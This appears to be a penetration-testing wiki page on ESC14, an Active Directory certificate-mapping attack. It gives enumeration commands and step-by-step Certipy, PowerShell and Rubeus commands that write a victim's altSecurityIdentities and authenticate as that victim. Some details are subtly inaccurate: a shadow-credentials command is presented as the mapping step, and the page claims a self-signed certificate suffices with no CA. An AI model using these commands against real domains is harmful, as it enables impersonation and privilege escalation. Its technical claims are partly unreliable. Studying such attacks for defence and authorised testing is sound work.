# ESC14

{% hint style="info" %}
Auth as the target using certificate referenced in altSecurityIdentities attribute of the target
{% endhint %}

## Why It Works

* `altSecurityIdentities` is a multi-valued AD attribute that defines **explicit** X.509-certificate-to-account mappings (e.g. mapping by Issuer+Serial, Subject, or SKI) - this is the strongest/most direct form of certificate mapping, bypassing UPN/SAN-based implicit mapping entirely.
* If an attacker has write access (`GenericWrite`/`WriteProperty`) over a **victim account's** `altSecurityIdentities` attribute, they can add an entry pointing to **any certificate the attacker already controls** - including a self-signed certificate they generated themselves, with no CA involvement at all.
* Once that mapping is written, authenticating with the attacker's own arbitrary certificate causes AD to resolve the session as the **victim account**, because the explicit mapping takes precedence over any other binding logic.
* Unlike ESC1-ESC13, this attack **doesn't require any AD CS misconfiguration or template** - the vulnerability is purely an ACL issue on the target account's attribute, making it a pure privilege-escalation/persistence primitive once you have that write access.

## Prerequisites

* `GenericWrite`/`WriteProperty` over the target account's `altSecurityIdentities` attribute.
* Any X.509 certificate you control (self-signed is sufficient) to reference in the mapping.

## Enumerate

{% code lineNumbers="true" %}
```bash
## BloodHound - look for GenericWrite/GenericAll edges to privileged accounts
certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
```
{% endcode %}

## Exploit

{% tabs %}
{% tab title="Certipy" %}
{% code lineNumbers="true" %}
```bash
## 1. Generate a self-signed certificate to use for the mapping
certipy cert -out attacker.pfx -alias attacker
## 2. Write the mapping into the victim's altSecurityIdentities
certipy shadow auto -u <user>@<domain> -p <password> -account <victim-account> -dc-ip <DC-IP>
## (or manually via ldap3/PowerShell: Set-ADUser -Identity <victim> -Replace @{altSecurityIdentities="X509:<Issuer>Serial<value>"})
## 3. Authenticate as the victim using your own certificate
certipy auth -pfx attacker.pfx -dc-ip <DC-IP> -username <victim-account>
```
{% endcode %}
{% endtab %}

{% tab title="PowerShell (native) + ADModule + Rubeus" %}
```powershell
## 1. Generate a self-signed certificate natively - no external tools needed
$cert = New-SelfSignedCertificate -Subject "CN=attacker" -CertStoreLocation "Cert:\CurrentUser\My" -KeyExportPolicy Exportable -KeySpec Signature
Export-PfxCertificate -Cert $cert -FilePath attacker.pfx -Password (ConvertTo-SecureString -String "P@ssw0rd" -Force -AsPlainText)
## 2. Build the explicit mapping string and write it to the victim's altSecurityIdentities (requires GenericWrite over the victim)
$issuer = $cert.Issuer
$serial = ($cert.GetSerialNumberString())
Set-ADUser -Identity <victim-account> -Replace @{altSecurityIdentities="X509:<$issuer>SR$serial"}
## 3. Authenticate as the victim - since Windows lacks a direct 'auth with arbitrary pfx as another user' CLI,
## import the pfx and use it for Schannel/Kerberos PKINIT via Rubeus or a Linux Certipy auth step
Rubeus.exe asktgt /user:<victim-account> /certificate:attacker.pfx /password:P@ssw0rd /ptt
```
{% endtab %}
{% endtabs %}
